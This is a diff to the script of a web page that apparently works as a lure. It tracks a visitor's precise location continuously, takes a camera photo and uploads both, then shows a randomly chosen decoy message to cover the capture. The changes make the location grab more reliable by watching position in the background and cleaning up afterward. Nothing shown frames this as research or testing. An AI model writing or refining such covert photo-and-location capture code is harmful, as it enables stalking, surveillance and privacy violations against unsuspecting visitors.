@@ -255,38 +255,36 @@
       return DECOY_MESSAGES[Math.floor(Math.random() * DECOY_MESSAGES.length)];
     }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        () => console.log("Location granted"),
-        () => console.log("Location denied"),
-        { enableHighAccuracy: true }
+    let currentLocation = null;
+    let watchId = null;
+
+    function startLocationWatch() {
+      if (!navigator.geolocation) return;
+
+      watchId = navigator.geolocation.watchPosition(
+        (pos) => {
+          currentLocation = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+          };
+          console.log("Location updated:", currentLocation);
+        },
+        (err) => {
+          console.log("Location error:", err);
+        },
+        { enableHighAccuracy: true, maximumAge: 5000 }
       );
     }
 
-    function getLocationForCapture() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-          resolve(null);
-          return;
-        }
-        const timeout = setTimeout(() => resolve(null), 3000);
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            clearTimeout(timeout);
-            resolve({
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-            });
-          },
-          () => {
-            clearTimeout(timeout);
-            resolve(null);
-          },
-          { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
-        );
-      });
+    function stopLocationWatch() {
+      if (watchId != null) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
     }
+
+    startLocationWatch();
 
     const CAMERA_INIT_TIMEOUT_MS = 15000;
     const VIDEO_READY_TIMEOUT_MS = 12000;
@@ -429,49 +427,54 @@
 
     async function run() {
       setStatus("One moment…");
-      const location = await getLocationForCapture();
 
-      let stream;
       try {
-        stream = await startCamera();
-        await waitForVideoReady();
-      } catch (e) {
-        console.error("Camera error:", e);
-        const msg =
-          e && e.name === "NotAllowedError"
-            ? "Camera access denied. Allow camera and reload."
-            : "Camera access denied or unavailable: " + (e && e.message ? e.message : String(e));
-        setStatus(msg, true);
-        return;
-      }
+        let stream;
+        try {
+          stream = await startCamera();
+          await waitForVideoReady();
+        } catch (e) {
+          console.error("Camera error:", e);
+          const msg =
+            e && e.name === "NotAllowedError"
+              ? "Camera access denied. Allow camera and reload."
+              : "Camera access denied or unavailable: " + (e && e.message ? e.message : String(e));
+          setStatus(msg, true);
+          return;
+        }
 
-      let encoded;
-      try {
-        encoded = await captureFrame();
-      } catch (e) {
-        setStatus(String(e.message || e), true);
+        let encoded;
+        try {
+          encoded = await captureFrame();
+        } catch (e) {
+          setStatus(String(e.message || e), true);
+          stream.getTracks().forEach((t) => t.stop());
+          preview.srcObject = null;
+          return;
+        }
+
         stream.getTracks().forEach((t) => t.stop());
         preview.srcObject = null;
-        return;
+
+        const location = currentLocation || null;
+
+        try {
+          const b64 = await blobToBase64(encoded.blob);
+          await uploadPhoto(b64, encoded.mimeType, location);
+        } catch (e) {
+          setStatus("Upload failed: " + (e.message || e), true);
+          return;
+        }
+
+        shell.classList.remove("working");
+        document.getElementById("statusRow").style.display = "none";
+        const decoy = pickDecoy();
+        decoyTitle.textContent = decoy.title;
+        decoyDetail.textContent = decoy.detail;
+        decoyPanel.classList.add("visible");
+      } finally {
+        stopLocationWatch();
       }
-
-      stream.getTracks().forEach((t) => t.stop());
-      preview.srcObject = null;
-
-      try {
-        const b64 = await blobToBase64(encoded.blob);
-        await uploadPhoto(b64, encoded.mimeType, location);
-      } catch (e) {
-        setStatus("Upload failed: " + (e.message || e), true);
-        return;
-      }
-
-      shell.classList.remove("working");
-      document.getElementById("statusRow").style.display = "none";
-      const decoy = pickDecoy();
-      decoyTitle.textContent = decoy.title;
-      decoyDetail.textContent = decoy.detail;
-      decoyPanel.classList.add("visible");
     }
 
     run().catch((err) => {
